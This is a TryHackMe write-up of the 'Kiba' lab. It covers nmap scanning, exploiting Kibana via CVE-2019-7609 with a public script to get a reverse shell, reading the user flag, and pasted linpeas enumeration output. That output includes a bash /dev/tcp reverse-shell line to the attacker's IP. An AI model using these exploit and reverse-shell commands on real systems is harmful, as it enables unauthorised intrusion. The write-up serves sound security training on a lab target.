<p align="center"><p align="center">April 7, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{337}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
  <img width="160px" src="https://github.com/user-attachments/assets/fd531592-487b-4cb5-8259-63887615d678"></p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Kiba}}$$</h1>


<p align="center">Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution. It is classified as an easy-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click <a href="https://tryhackme.com/room/kiba">Kiba</a>.</p>

<p align="center"> <img width="900px" src=""> </p>

<br>
<br> It is classified as an easy-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click <a href="https://tryhackme.com/room/kiba">Kiba</a>.</p>

<p align="center"> <img width="900px" src=""> </p>

<br>
<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h2>


<p align="center">There are have 3 ports open: <code>ssh/22</code>, <code>http/80</code> and <code>esmagent?/5601</code>. </p>

```bash
:~# nmap -sC -sV -sS -O -A -Pn -p- TargetIP
...
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Tue, 08 Apr 2025 00:53:49 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Tue, 08 Apr 2025 00:53:49 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Tue, 08 Apr 2025 00:53:49 GMT
|_    {"statusCode":404,"error":"Not Found"}
...
```

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Kibana}}$$</h2>
<p>Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw.</p>




<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Navigated to http://TargetIP:5601}}$$</h2>

![image](https://github.com/user-attachments/assets/db494326-46c0-418c-81ca-4aaaf48f54f7)

<br>

![image](https://github.com/user-attachments/assets/4bdaf403-5030-4c5e-adb1-66183ce154ac)

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{CVE-2019-7609}}$$</h2>

https://nvd.nist.gov/vuln/detail/cve-2019-7609

![image](https://github.com/user-attachments/assets/0b3b8237-3715-4e9f-bf03-f73056bba5dd)

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{Downloaded an exploit for CVE-2019-7609}}$$</h2>

https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/refs/heads/master/CVE-2019-7609-kibana-rce.py


<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Ran the exploit in Attack vm after setting up a listener}}$$</h2>

```bash
:~/kiba# ls
CVE-2019-7609-kibana-rce.py
:~/kiba# python CVE-2019-7609-kibana-rce.py -u http://TargetIP:5601 -host AttackIP -port AttackPort --shell
[+] http://10.10.25.155:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: AttackIP:AttackPort
:~/kiba# 
```

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Got the Shell}}$$</h2>

<br>

![image](https://github.com/user-attachments/assets/083ceee1-add8-4be0-8293-0f9c9a905cd8)


<br>


```bash
:~/kiba# nc -lnvp 4444
...
kiba@ubuntu:/home/kiba/kibana/bin$ id
id
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
kiba@ubuntu:/home/kiba/kibana/bin$ cd ..
cd ..
kiba@ubuntu:/home/kiba/kibana$ cd ..
cd ..
kiba@ubuntu:/home/kiba$ ls
ls
elasticsearch-6.5.4.deb
kibana
user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
kiba@ubuntu:/home/kiba$ 
```
<br>


<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Downloaded linpeas.sh into the target vm}}$$</h2>

<br>

![image](https://github.com/user-attachments/assets/1758203c-86d4-4ddb-a4f3-c174f005941a)

<br>

![image](https://github.com/user-attachments/assets/0587d155-b805-46ea-b1d3-4f3f466d2605)


<br>

```bash

...

[+] Installed Compiler
/usr/share/gcc-5


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elastic+   660  7.2 25.8 3182380 528532 ?      Ssl  10:29   1:10 /usr/bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djna.nosys=true -XX:-OmitStackTraceInFastThrow -Dio.netty.noUnsafe=true -Dio.netty.noKeySetOptimization=true -Dio.netty.recycler.maxCapacityPerThread=0 -Dlog4j.shutdownHookEnabled=false -Dlog4j2.disable.jmx=true -Djava.io.tmpdir=/tmp/elasticsearch.2hLZc6Hz -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/elasticsearch -XX:ErrorFile=/var/log/elasticsearch/hs_err_pid%p.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -XX:+PrintGCApplicationStoppedTime -Xloggc:/var/log/elasticsearch/gc.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=32 -XX:GCLogFileSize=64m -Des.path.home=/usr/share/elasticsearch -Des.path.conf=/etc/elasticsearch -Des.distribution.flavor=default -Des.distribution.type=deb -cp /usr/share/elasticsearch/lib/* org.elasticsearch.bootstrap.Elasticsearch -p /var/run/elasticsearch/elasticsearch.pid --quiet
elastic+   940  0.0  0.0 135668   644 ?        Sl   10:29   0:00 /usr/share/elasticsearch/modules/x-pack-ml/platform/linux-x86_64/bin/controller
kiba       950  0.0  0.0   4500    72 ?        Ss   10:30   0:00 /bin/sh -c cd /home/kiba/kibana/bin && bash kibana
kiba       953  4.6 14.2 1462212 292140 ?      Sl   10:30   0:43 ./../node/bin/node --no-warnings ./../src/cli
kiba      2816  0.0  0.1  18024  2216 ?        S    10:39   0:00 /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.133.138/4444 0>&1
kiba      2822  0.0  0.1  19224  3560 ?        S    10:39   0:00 /bin/bash -i
kiba     12001  0.1  0.1   5224  2264 ?        S    10:44   0:00 /bin/sh ./linpeas.sh
kiba     14515  0.0  1.3 873812 28432 ?        Rl   10:45   0:00 /home/kiba/kibana/node/bin/node --no-warnings /home/kiba/kibana/node_modules/x-pack/plugins/canvas/server/lib/route_expression/thread/babeled.js
kiba     14537  0.0  0.1  34420  2812 ?        R    10:45   0:00 ps aux
kiba     14539  0.0  0.0  12892   804 ?        S    10:45   0:00 sort
logstash   585 13.0 24.3 3159876 497340 ?      SNsl 10:29   2:06 /usr/bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -Djruby.regexp.interruptible=true -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -Dlog4j2.isThreadContextMapInheritable=true -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.13.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.10.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/javassist-3.26.0-GA.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.2.9.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.12.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.12.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.12.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/reflections-0.9.11.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
message+   566  0.0  0.0  42892   148 ?        Ss   10:29   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root         1  0.1  0.1  37264  2648 ?        Ss   10:29   0:01 /sbin/init noprompt
root       206  0.0  0.1  38236  3500 ?        Ss   10:29   0:00 /lib/systemd/systemd-journald
root       266  0.0  0.0  44304  1104 ?        Ss   10:29   0:00 /lib/systemd/systemd-udevd
root       531  0.0  0.0  16120     4 ?        Ss   10:29   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       564  0.0  0.0 275856    96 ?        Ssl  10:29   0:00 /usr/lib/accountsservice/accounts-daemon
root       617  0.0  0.0  20092    88 ?        Ss   10:29   0:00 /lib/systemd/systemd-logind
root       620  0.0  0.0  29004   540 ?        Ss   10:29   0:00 /usr/sbin/cron -f
root       697  0.0  0.0  15748   128 ttyS0    Ss+  10:29   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root       707  0.0  0.0  15932   132 tty1     Ss+  10:29   0:00 /sbin/agetty --noclear tty1 linux
root       716  0.0  0.0  65508     0 ?        Ss   10:29   0:00 /usr/sbin/sshd -D
root       756  0.0  0.0  71580    64 ?        Ss   10:29   0:00 /usr/sbin/apache2 -k start
root       947  0.0  0.0  50216   296 ?        S    10:30   0:00 /usr/sbin/CRON -f
syslog     587  0.0  0.0 256388    72 ?        Ssl  10:29   0:00 /usr/sbin/rsyslogd -n
systemd+   307  0.0  0.0 100320   112 ?        Ssl  10:29   0:00 /lib/systemd/systemd-timesyncd
www-data   759  0.0  0.0 360736    52 ?        Sl   10:29   0:00 /usr/sbin/apache2 -k start
www-data   760  0.0  0.0 360736    52 ?        Sl   10:29   0:00 /usr/sbin/apache2 -k start

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
lrwxrwxrwx 1 root root       4 Mar 31  2020 /bin/sh -> dash
-rwxr-xr-x 1 root root  326232 Feb  5  2020 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root  618520 Feb  5  2020 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  141904 Feb  5  2020 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root  453240 Feb  5  2020 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root   44104 Jan 27  2020 /sbin/agetty
-rwxr-xr-x 1 root root  487248 Mar  5  2018 /sbin/dhclient
lrwxrwxrwx 1 root root      20 Feb  5  2020 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root  224208 Nov 29  2019 /usr/bin/dbus-daemon
lrwxrwxrwx 1 root root      22 Mar 31  2020 /usr/bin/java -> /etc/alternatives/java
-rwxr-xr-x 1 root root  164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root  662560 Oct  8  2019 /usr/sbin/apache2
-rwxr-xr-x 1 root root   44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root  599328 Mar 25  2019 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root  791024 Mar  4  2019 /usr/sbin/sshd
-rwxr-xr-x 1 root root   84352 Dec 17  2018 /usr/share/elasticsearch/modules/x-pack-ml/platform/linux-x86_64/bin/controller

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
-rw-r--r-- 1 root root  822 Mar 31  2020 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Mar 31  2020 .
drwxr-xr-x 95 root root 4096 Jul 23  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  190 Mar 31  2020 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Mar 31  2020 .
drwxr-xr-x 95 root root 4096 Jul 23  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x  1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 31  2020 .
drwxr-xr-x 95 root root 4096 Jul 23  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 31  2020 .
drwxr-xr-x 95 root root 4096 Jul 23  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Mar 31  2020 .
drwxr-xr-x 95 root root 4096 Jul 23  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  210 Jan 27  2020 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*  *	* * *	root	cd /root/ufw && bash ufw.sh
*  *	* * *	kiba	cd /home/kiba/kibana/bin && bash kibana

[+] Services
[i] Search for outdated versions
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ + ]  console-setup
 [ + ]  cron
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ - ]  keyboard-setup.dpkg-bak
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  metricbeat
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  networking
 [ + ]  ondemand
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  sendsigs
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  urandom
 [ - ]  uuidd
 [ - ]  x11-common

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
You can't write on systemd PATH so I'm not going to list relative paths executed by services

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES
Wed 2025-04-09 14:46:29 PDT  4h 0min left Wed 2025-04-09 10:29:30 PDT  16min ago    motd-news.timer              motd-news.service
Thu 2025-04-10 03:13:17 PDT  16h left     Wed 2025-04-09 10:29:30 PDT  16min ago    apt-daily.timer              apt-daily.service
Thu 2025-04-10 06:31:32 PDT  19h left     Wed 2025-04-09 10:29:30 PDT  16min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2025-04-10 10:44:26 PDT  23h left     Wed 2025-04-09 10:44:26 PDT  1min 17s ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a          n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                               PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 1 systemd         root             :1.0          init.scope                -          -                  
:1.1                               564 accounts-daemon root             :1.1          accounts-daemon.service   -          -                  
:1.127                           16918 busctl          kiba             :1.127        cron.service              -          -                  
:1.2                               617 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
com.ubuntu.LanguageSelector          - -               -                (activatable) -                         -         
org.freedesktop.Accounts           564 accounts-daemon root             :1.1          accounts-daemon.service   -          -                  
 -- UID=0 EUID=0 
org.freedesktop.DBus               566 dbus-daemon     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.hostname1            - -               -                (activatable) -                         -         
org.freedesktop.locale1              - -               -                (activatable) -                         -         
org.freedesktop.login1             617 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1             - -               -                (activatable) -                         -         
org.freedesktop.resolve1             - -               -                (activatable) -                         -         
org.freedesktop.systemd1             1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.timedate1            - -               -                (activatable) -                         -         


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
ubuntu
127.0.0.1	localhost
127.0.1.1	ubuntu

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:b5:c5:c7:c0:c5  
          inet addr:10.10.239.215  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::b5:c5ff:fec7:c0c5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:342 errors:0 dropped:0 overruns:0 frame:0
          TX packets:354 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:264134 (264.1 KB)  TX bytes:100351 (100.3 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:15569 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15569 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:2621460 (2.6 MB)  TX bytes:2621460 (2.6 MB)

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
10.10.0.0       *               255.255.0.0     U     0      0        0 eth0

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:5601            0.0.0.0:*               LISTEN      953/node        
tcp        0      0 127.0.0.1:40764         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40772         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40784         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40768         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 10.10.239.215:42004     10.10.133.138:4444      ESTABLISHED 2822/bash       
tcp        0      0 127.0.0.1:40778         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40766         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40770         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40756         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40780         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40762         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40754         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40760         127.0.0.1:9200          ESTABLISHED 953/node        
tcp        0      0 127.0.0.1:40752         127.0.0.1:9200          ESTABLISHED 953/node        
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 127.0.0.1:9600          :::*                    LISTEN      -               
tcp6       0      0 127.0.0.1:9200          :::*                    LISTEN      -               
tcp6       0      0 ::1:9200                :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::5044                 :::*                    LISTEN      -               
tcp6       0      0 127.0.0.1:9300          :::*                    LISTEN      -               
tcp6       0      0 ::1:9300                :::*                    LISTEN      -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40780         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40778         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40784         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40752         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40772         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40760         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40756         ESTABLISHED -               
tcp6       0      0 127.0.0.1:40782         127.0.0.1:9200          ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40754         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40762         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40768         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40782         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40766         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40764         ESTABLISHED -               
tcp6       0      0 127.0.0.1:9200          127.0.0.1:40770         ESTABLISHED -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               

[+] Can I sniff with tcpdump?
No


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)

[+] Do I have PGP keys?

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
kiba:x:1000:1000:kiba,,,:/home/kiba:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=109(elasticsearch) gid=116(elasticsearch) groups=116(elasticsearch)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=999(logstash) gid=999(logstash) groups=999(logstash)

[+] Login now
 10:45:47 up 16 min,  0 users,  load average: 2.25, 2.04, 1.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons
kiba     pts/0        192.168.85.1     Tue Mar 31 22:19 - 22:20  (00:01)
